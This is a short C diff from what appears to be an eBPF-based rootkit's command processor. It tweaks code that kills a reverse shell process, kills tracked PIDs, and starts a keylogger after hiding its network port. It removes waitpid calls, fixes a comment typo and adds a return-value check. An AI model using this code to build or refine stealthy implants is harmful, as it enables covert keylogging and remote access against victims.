@@ -29,17 +29,15 @@ static void kill_all_tracked_pids(int tracked_pids_map_fd) {
     while (ret == 0) {
         pid = next_pid;
 
-        if (pid != getpid()) {
+        if (pid != getpid())
             kill(pid, SIGKILL);
-            waitpid(pid, NULL, 0);
-        }
 
         ret = bpf_map_get_next_key(tracked_pids_map_fd, &pid, &next_pid);
     }
 }
 
 /**
- * @brief Kill revese shell process.
+ * @brief Kill reverse shell process.
  *
  * @param command_processor_ctx
  */
@@ -51,7 +49,6 @@ static void remove_reverse_shell(command_processor_context_t *command_processor_
 
     if (*(command_processor_ctx->reverse_shell_pid) > 0) {
         kill(*(command_processor_ctx->reverse_shell_pid), SIGKILL);
-        waitpid(*(command_processor_ctx->reverse_shell_pid), NULL, 0);
 
         *(command_processor_ctx->reverse_shell_pid) = -1;
     }
@@ -63,7 +60,7 @@ static int keylogger_start(command_processor_context_t *command_processor_ctx) {
 
     int ret = 0;
 
-    hider_hide_port(command_processor_ctx->hider_ctx, KEYLOGGER_PORT);
+    ret = hider_hide_port(command_processor_ctx->hider_ctx, KEYLOGGER_PORT);
     if (ret != 0)
         return ret;
 
